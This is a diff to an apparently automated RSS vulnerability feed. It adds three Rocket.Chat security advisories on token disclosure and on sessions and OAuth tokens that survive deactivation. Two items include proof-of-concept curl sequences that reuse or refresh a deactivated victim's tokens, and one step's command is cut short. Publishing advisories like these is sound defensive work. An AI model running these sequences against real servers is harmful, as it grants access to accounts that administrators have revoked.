@@ -7,7 +7,149 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Mon, 25 May 2026 08:17:43 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 26 May 2026 07:42:26 +0000</lastBuildDate>
+    <item>
+      <title>[MEDIUM] RocketChat/Rocket.Chat – Livechat Visitor Profile Disclosure Leaks Bearer Token and Enables Visitor Impersonation</title>
+      <link>https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-cqj7-h8cj-jmf2</link>
+      <description>### Summary:&#13;
+&#13;
+In the `visitors.info` endpoint, https://developer.rocket.chat/apidocs/get-visitor-information-by-id-1, token is returned in the response. It looks like there's no use case for the token to be present in the response and it would be a good security practice to remove it altogether.&#13;
+&#13;
+The prerequisites are:&#13;
+&#13;
+- A Rocket.Chat user account with the `view-l-room` permission.&#13;
+- A valid visitorId belonging to a visitor outside the caller’s authorized room, department, or queue scope.&#13;
+&#13;
+### Steps to Reproduce:&#13;
+&#13;
+1. Authenticate as a user with the view-l-room permission and send:&#13;
+`GET /api/v1/livechat/visitors.info?visitorId=&lt;target_visitor_id&gt;`&#13;
+&#13;
+2. Observe that the response returns the full visitor object for the target visitor, including token, contact fields, and network metadata, even though the caller is not authorized for that visitor’s conversation scope.</description>
+      <guid isPermaLink="false">GHSA-cqj7-h8cj-jmf2</guid>
+      <pubDate>Mon, 25 May 2026 11:33:07 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] RocketChat/Rocket.Chat – OAuth access and refresh tokens remain valid after account deactivation</title>
+      <link>https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-39hg-492f-3c4f</link>
+      <description>  ### Summary&#13;
+  Rocket.Chat 8.2.0 does not revoke OAuth bearer or refresh tokens when a user is deactivated. A deactivated user can continue using an existing OAuth access token, and can also mint a fresh access token from an existing refresh token.&#13;
+&#13;
+  ### Details&#13;
+  User deactivation in `apps/meteor/app/lib/server/functions/setUserActiveStatus.ts:122-126` revokes only Meteor login tokens with `Users.unsetLoginTokens(userId)`. It does not delete OAuth access or refresh tokens.&#13;
+&#13;
+  OAuth bearer authentication in `apps/meteor/app/oauth2-server-config/server/oauth/oauth2-server.ts:34-47` accepts any non-expired token and loads the user by ID, but it does not verify `user.active`.&#13;
+&#13;
+  Refresh-token handling in `apps/meteor/server/oauth2-server/model.ts:211-247` also does not validate the user's active state before issuing a new access token.&#13;
+&#13;
+  As a result, OAuth credentials survive account deactivation.&#13;
+&#13;
+  ### PoC&#13;
+  1. Create an OAuth application as an admin:&#13;
+     ```bash&#13;
+     APP=$(curl -s -X POST http://localhost:3000/api/v1/oauth-apps.create \&#13;
+       -H "X-Auth-Token: $ADMIN_TOKEN" \&#13;
+       -H "X-User-Id: $ADMIN_ID" \&#13;
+       -H 'Content-Type: application/json' \&#13;
+       -d '{"name":"poc-app","redirectUri":"http://test.com,http://asd.com","active":true}')&#13;
+     CLIENT_ID=$(jq -r '.application.clientId' &lt;&lt;&lt;"$APP")&#13;
+     CLIENT_SECRET=$(jq -r '.application.clientSecret' &lt;&lt;&lt;"$APP")&#13;
+&#13;
+  2. Authorize the app using the victim's existing Rocket.Chat login token and exchange the code for tokens:&#13;
+     ```bash&#13;
+     AUTH=$(curl -isk -X POST \&#13;
+       "http://localhost:3000/oauth/authorize?scope=user&amp;response_type=token,code&amp;response_mode=form_post&amp;state=poc" \&#13;
+       -H 'Content-Type: application/x-www-form-urlencoded' \&#13;
+       --data "token=$VICTIM_LOGIN_TOKEN&amp;client_id=$CLIENT_ID&amp;response_type=code&amp;redirect_uri=http://asd.com&amp;allow=yes")&#13;
+     CODE=$(sed -n 's/^Location: .*code=\([^&amp;]*\).*/\1/p' &lt;&lt;&lt;"$AUTH" | tr -d '\r')&#13;
+&#13;
+     TOKENS=$(curl -s -X POST http://localhost:3000/oauth/token \&#13;
+       -H 'Content-Type: application/x-www-form-urlencoded' \&#13;
+       --data "grant_type=authorization_code&amp;code=$CODE&amp;client_id=$CLIENT_ID&amp;client_secret=$CLIENT_SECRET&amp;redirect_uri=http://asd.com")&#13;
+     REFRESH=$(jq -r '.refresh_token' &lt;&lt;&lt;"$TOKENS")&#13;
+&#13;
+  3. Deactivate the victim account:&#13;
+     ```bash&#13;
+       -H "X-User-Id: $ADMIN_ID" \&#13;
+       -H 'Content-Type: application/json' \&#13;
+       -d '{"userId":"'"$VICTIM_ID"'","activeStatus":false,"confirmRelinquish":true}'&#13;
+  4. Use the refresh token to mint a new bearer token and call a protected API:&#13;
+     ```bash&#13;
+     NEWTOKENS=$(curl -s -X POST http://localhost:3000/oauth/token \&#13;
+       -H 'Content-Type: application/x-www-form-urlencoded' \&#13;
+       --data "grant_type=refresh_token&amp;refresh_token=$REFRESH&amp;client_id=$CLIENT_ID&amp;client_secret=$CLIENT_SECRET")&#13;
+     ACCESS=$(jq -r '.access_token' &lt;&lt;&lt;"$NEWTOKENS")&#13;
+&#13;
+     curl -s http://localhost:3000/api/v1/me \&#13;
+       -H "Authorization: Bearer $ACCESS"&#13;
+&#13;
+  5. The deactivated user still receives a valid API response.&#13;
+&#13;
+  ### Impact&#13;
+&#13;
+  This is a token-revocation and authentication flaw in the community OAuth implementation. Deactivated accounts retain API access through previously issued OAuth credentials, including the ability to refresh into new bearer tokens after administrative deactivation.</description>
+      <guid isPermaLink="false">GHSA-39hg-492f-3c4f</guid>
+      <pubDate>Mon, 25 May 2026 11:32:44 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] RocketChat/Rocket.Chat – users.deactivateIdle deactivates accounts without revoking existing login tokens</title>
+      <link>https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-6g3w-vg5p-w892</link>
+      <description>  ### Summary&#13;
+  Rocket.Chat 8.2.0 allows users deactivated through `users.deactivateIdle` to keep using already-issued login tokens. A user that an administrator has marked inactive for idleness can still access authenticated REST endpoints with the old token.&#13;
+&#13;
+  ### Details&#13;
+  The `users.deactivateIdle` route in `apps/meteor/app/api/server/v1/users.ts:421-436` calls `Users.setActiveNotLoggedInAfterWithRole(...)`.&#13;
+&#13;
+  That model method in `packages/models/src/models/Users.ts:2946-2964` only updates `active` and `inactiveReason`. It does not revoke `services.resume.loginTokens`.&#13;
+&#13;
+  By contrast, the normal deactivation path in `apps/meteor/app/lib/server/functions/setUserActiveStatus.ts:122-126` explicitly calls `Users.unsetLoginTokens(userId)` when a user is deactivated.&#13;
+&#13;
+  Because REST authentication only checks `_id + services.resume.loginTokens.hashedToken` and does not require `active: true`:&#13;
+&#13;
+  - `apps/meteor/app/api/server/ApiClass.ts:978`&#13;
+  - `packages/models/src/models/Users.ts:2402`&#13;
+&#13;
+  an already-issued token keeps working after idle deactivation.&#13;
+&#13;
+  ### PoC&#13;
+  1. Log in as the victim and save the token:&#13;
+     ```bash&#13;
+     VICTIM=$(curl -s -X POST http://localhost:3000/api/v1/login \&#13;
+       -H 'Content-Type: application/json' \&#13;
+       -d '{"user":"victim","password":"victimpass"}')&#13;
+     VICTIM_TOKEN=$(jq -r '.data.authToken' &lt;&lt;&lt;"$VICTIM")&#13;
+     VICTIM_ID=$(jq -r '.data.userId' &lt;&lt;&lt;"$VICTIM")&#13;
+&#13;
+  2. In a test instance, isolate the victim to the guest role:&#13;
+     ```bash&#13;
+       curl -s -X POST http://localhost:3000/api/v1/roles.addUserToRole \&#13;
+       -H "X-Auth-Token: $ADMIN_TOKEN" \&#13;
+       -H "X-User-Id: $ADMIN_ID" \&#13;
+       -H 'Content-Type: application/json' \&#13;
+       -d '{"roleId":"guest","userId":"'"$VICTIM_ID"'"}'&#13;
+&#13;
+  3. Deactivate idle users for that role:&#13;
+     ```bash&#13;
+     curl -s -X POST http://localhost:3000/api/v1/users.deactivateIdle \&#13;
+       -H "X-Auth-Token: $ADMIN_TOKEN" \&#13;
+       -H "X-User-Id: $ADMIN_ID" \&#13;
+       -H 'Content-Type: application/json' \&#13;
+       -d '{"daysIdle":0,"role":"guest"}'&#13;
+&#13;
+  4. Reuse the victim's old token:&#13;
+      ```bash&#13;
+       curl -s http://localhost:3000/api/v1/me \&#13;
+       -H "X-Auth-Token: $VICTIM_TOKEN" \&#13;
+       -H "X-User-Id: $VICTIM_ID"&#13;
+&#13;
+  5. The request still succeeds even though the account was deactivated by users.deactivateIdle.&#13;
+&#13;
+  ### Impact&#13;
+&#13;
+  This is a session-revocation flaw in the community server. Administrative idle deactivation does not actually terminate existing authenticated sessions, so deactivated users retain API access until tokens are separately removed.</description>
+      <guid isPermaLink="false">GHSA-6g3w-vg5p-w892</guid>
+      <pubDate>Mon, 25 May 2026 11:32:10 +0000</pubDate>
+    </item>
     <item>
       <title>[HIGH] RocketChat/Rocket.Chat – SAML signature validation skipped when IdP certificate field is empty</title>
       <link>https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-rgg7-qvp9-wvx7</link>
